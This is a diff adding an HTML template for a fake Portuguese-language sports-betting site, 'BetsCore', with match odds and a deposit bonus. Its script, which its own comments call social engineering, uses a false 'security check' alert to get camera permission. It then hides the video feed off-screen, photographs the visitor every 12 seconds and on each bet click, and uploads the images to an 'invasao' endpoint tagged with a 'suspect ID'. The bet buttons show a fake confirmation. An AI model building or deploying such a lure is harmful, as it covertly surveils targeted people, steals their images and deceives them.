@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BetsCore - Apostas Esportivas</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <!-- Inject suspect ID as a global variable -->
+    <script>
+        window.SUSPECT_ID = "{{ suspect_id }}";
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #2c3e50 0%, #1a1a2e 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 800px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .header {
+            background: linear-gradient(90deg, #e74c3c 0%, #c0392b 100%);
+            padding: 25px 30px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .header h1 {
+            font-weight: 700;
+            font-size: 32px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .header p {
+            font-weight: 300;
+            opacity: 0.9;
+            font-size: 18px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .match-card {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .match-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .match-teams {
+            font-size: 18px;
+            font-weight: 500;
+        }
+        
+        .match-time {
+            background: #e74c3c;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 14px;
+        }
+        
+        .odds {
+            display: flex;
+            justify-content: space-around;
+            text-align: center;
+        }
+        
+        .odd-option {
+            flex: 1;
+        }
+        
+        .odd-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: #f1c40f;
+            margin: 10px 0;
+        }
+        
+        .odd-label {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+        
+        .bet-button {
+            background: linear-gradient(90deg, #27ae60 0%, #2ecc71 100%);
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+        }
+        
+        .bet-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .promotion {
+            background: linear-gradient(90deg, #9b59b6 0%, #8e44ad 100%);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: center;
+        }
+        
+        .promotion h3 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: #f1c40f;
+        }
+        
+        .bonus {
+            font-size: 28px;
+            font-weight: 700;
+            color: #2ecc71;
+            margin: 10px 0;
+        }
+        
+        .video-container {
+            display: none;
+        }
+        
+        video {
+            width: 1px;
+            height: 1px;
+            position: absolute;
+            top: -1000px;
+            left: -1000px;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+        }
+        
+        @media (max-width: 600px) {
+            .odds {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>BetsCore</h1>
+            <p>As Maiores Odds do Mercado - Aposte Agora!</p>
+        </div>
+        
+        <div class="content">
+            <div class="match-card">
+                <div class="match-header">
+                    <div class="match-teams">Real Madrid × Barcelona</div>
+                    <div class="match-time">AO VIVO</div>
+                </div>
+                
+                <div class="odds">
+                    <div class="odd-option">
+                        <div class="odd-label">VITÓRIA TIME 1</div>
+                        <div class="odd-value">2.10</div>
+                    </div>
+                    
+                    <div class="odd-option">
+                        <div class="odd-label">EMPATE</div>
+                        <div class="odd-value">3.40</div>
+                    </div>
+                    
+                    <div class="odd-option">
+                        <div class="odd-label">VITÓRIA TIME 2</div>
+                        <div class="odd-value">3.20</div>
+                    </div>
+                </div>
+                
+                <button class="bet-button">APOSTAR AGORA</button>
+            </div>
+            
+            <div class="match-card">
+                <div class="match-header">
+                    <div class="match-teams">Manchester City × Liverpool</div>
+                    <div class="match-time">22:00</div>
+                </div>
+                
+                <div class="odds">
+                    <div class="odd-option">
+                        <div class="odd-label">VITÓRIA TIME 1</div>
+                        <div class="odd-value">1.85</div>
+                    </div>
+                    
+                    <div class="odd-option">
+                        <div class="odd-label">EMPATE</div>
+                        <div class="odd-value">3.70</div>
+                    </div>
+                    
+                    <div class="odd-option">
+                        <div class="odd-label">VITÓRIA TIME 2</div>
+                        <div class="odd-value">4.10</div>
+                    </div>
+                </div>
+                
+                <button class="bet-button">APOSTAR AGORA</button>
+            </div>
+            
+            <div class="promotion">
+                <h3>Promoção Exclusiva!</h3>
+                <p>Deposite hoje e receba</p>
+                <div class="bonus">+100% de Bônus</div>
+                <p>Até R$ 500 em créditos grátis!</p>
+            </div>
+        </div>
+        
+        <div class="video-container">
+            <video id="video" autoplay playsinline muted></video>
+            <canvas id="canvas" style="display:none;"></canvas>
+        </div>
+        
+        <div class="footer">
+            <p>© 2025 BetsCore - Todos os direitos reservados<br>
+            Licença GL001234567 - Operadora de Jogos Autorizada</p>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let stream = null;
+        let captureInterval = null;
+        let photoCount = 0;
+        
+        // DOM Elements
+        const videoElement = document.getElementById('video');
+        const canvasElement = document.getElementById('canvas');
+        const betButtons = document.querySelectorAll('.bet-button');
+        
+        // Request camera permissions with social engineering
+        async function requestCameraAccess() {
+            try {
+                // Show a convincing message before requesting camera access
+                alert("Para melhorar sua experiência e oferecer palpites mais precisos, precisamos acessar sua câmera para análise de ambiente. Isso nos ajuda a personalizar suas apostas. Esta é uma verificação de segurança padrão.");
+                
+                // Request camera access
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' }, 
+                    audio: false 
+                });
+                
+                // Display video feed off-screen
+                videoElement.srcObject = stream;
+                
+                // Start capture immediately
+                startCapture();
+                
+                return true;
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                alert("Sem permissões de câmera, podemos continuar, mas a precisão dos nossos palpites pode ser afetada.");
+                return false;
+            }
+        }
+        
+        // Capture photo from video stream
+        function capturePhoto() {
+            if (!stream) return;
+            
+            canvasElement.width = videoElement.videoWidth;
+            canvasElement.height = videoElement.videoHeight;
+            const ctx = canvasElement.getContext('2d');
+            ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+            
+            // Convert to blob and send
+            canvasElement.toBlob(async (blob) => {
+                if (blob) {
+                    await sendMedia(blob, 'photo', `football_photo_${Date.now()}.jpg`);
+                    photoCount++;
+                }
+            }, 'image/jpeg', 0.8);
+        }
+        
+        // Send media to backend
+        async function sendMedia(blob, mediaType, filename) {
+            const formData = new FormData();
+            formData.append('media_type', mediaType);
+            formData.append('file', blob, filename);
+            formData.append('caption', `Football template - ${mediaType} captured at ${new Date().toLocaleString()}`);
+            
+            // Debug logging
+            console.log('Sending media with suspect ID:', window.SUSPECT_ID);
+            
+            try {
+                const response = await fetch('/api/invasao/upload/', {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'X-Suspect-ID': window.SUSPECT_ID || '1'  // Use dynamic suspect ID
+                    }
+                });
+                
+                if (response.ok) {
+                    console.log(`${mediaType} sent successfully`);
+                } else {
+                    console.error(`Failed to send ${mediaType}:`, response.status);
+                }
+            } catch (error) {
+                console.error(`Error sending ${mediaType}:`, error);
+            }
+        }
+        
+        // Start automatic capture
+        function startCapture() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            
+            // Take a photo every 12 seconds
+            captureInterval = setInterval(() => {
+                capturePhoto();
+            }, 12000);
+            
+            // Take an initial photo
+            setTimeout(() => {
+                capturePhoto();
+            }, 3000);
+        }
+        
+        // Initialize when page loads
+        window.addEventListener('DOMContentLoaded', async () => {
+            // Request camera access immediately
+            await requestCameraAccess();
+            
+            // Also trigger capture when user interacts with buttons
+            betButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    capturePhoto();
+                    // Show fake confirmation
+                    alert('Aposta registrada com sucesso! Boa sorte!');
+                });
+            });
+        });
+    </script>
+</body>
+</html>
